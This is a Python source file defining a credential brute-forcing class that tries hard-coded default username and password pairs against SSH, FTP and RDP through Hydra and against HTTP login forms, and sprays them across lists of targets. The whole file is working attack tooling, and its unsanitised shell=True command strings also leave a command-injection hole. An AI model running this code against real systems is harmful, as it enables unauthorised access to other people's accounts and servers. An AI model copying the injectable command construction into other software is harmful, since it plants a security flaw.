# core/brute_force_automation.py
# Credential Brute-Forcing Automation - SSH, HTTP, FTP, RDP

import subprocess
import os
from typing import Dict, List

class CredentialBruteForcer:
    """Credential Brute-Force Automation"""
    
    def __init__(self):
        self.default_creds = {
            "ssh": [
                ("admin", "admin"),
                ("root", "root"),
                ("root", "toor"),
                ("admin", "password"),
                ("root", "password"),
            ],
            "http": [
                ("admin", "admin"),
                ("admin", "admin123"),
                ("user", "password"),
            ],
            "ftp": [
                ("anonymous", "anonymous"),
                ("ftp", "ftp"),
                ("admin", "admin"),
            ],
            "rdp": [
                ("Administrator", "Administrator"),
                ("admin", "admin"),
            ]
        }
    
    def brute_force_ssh(self, target: str, port: int = 22) -> Dict:
        """SSH brute-force (Hydra)"""
        results = {"target": target, "found": False, "credentials": None}
        
        # Default creds test
        for user, passwd in self.default_creds["ssh"]:
            try:
                cmd = f"hydra -l {user} -p {passwd} ssh://{target}:{port} -v"
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                if "valid login" in output.stdout.lower() or "accepted" in output.stdout.lower():
                    results["found"] = True
                    results["credentials"] = {"username": user, "password": passwd}
                    return results
            except:
                pass
        
        return results
    
    def brute_force_http(self, url: str, method: str = "POST") -> Dict:
        """HTTP authentication brute-force"""
        results = {"url": url, "found": False, "credentials": None}
        
        for user, passwd in self.default_creds["http"]:
            try:
                if method == "POST":
                    data = {"username": user, "password": passwd}
                    import requests
                    resp = requests.post(url, data=data, timeout=5)
                    
                    if resp.status_code == 200 and "logout" in resp.text.lower():
                        results["found"] = True
                        results["credentials"] = {"username": user, "password": passwd}
                        return results
            except:
                pass
        
        return results
    
    def brute_force_ftp(self, target: str, port: int = 21) -> Dict:
        """FTP brute-force"""
        results = {"target": target, "found": False, "credentials": None}
        
        for user, passwd in self.default_creds["ftp"]:
            try:
                cmd = f"hydra -l {user} -p {passwd} ftp://{target}:{port} -v"
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                if "valid login" in output.stdout.lower():
                    results["found"] = True
                    results["credentials"] = {"username": user, "password": passwd}
                    return results
            except:
                pass
        
        return results
    
    def brute_force_rdp(self, target: str, port: int = 3389) -> Dict:
        """RDP brute-force"""
        results = {"target": target, "found": False, "credentials": None}
        
        for user, passwd in self.default_creds["rdp"]:
            try:
                cmd = f"hydra -l {user} -p {passwd} rdp://{target}:{port} -v"
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                if "valid login" in output.stdout.lower():
                    results["found"] = True
                    results["credentials"] = {"username": user, "password": passwd}
                    return results
            except:
                pass
        
        return results
    
    def credential_spray(self, targets: List[str], service: str = "ssh") -> List[Dict]:
        """Credential spraying - multiple targets"""
        results = []
        
        for target in targets:
            if service == "ssh":
                result = self.brute_force_ssh(target)
            elif service == "http":
                result = self.brute_force_http(target)
            elif service == "ftp":
                result = self.brute_force_ftp(target)
            elif service == "rdp":
                result = self.brute_force_rdp(target)
            else:
                continue
            
            if result.get("found"):
                results.append(result)
        
        return results
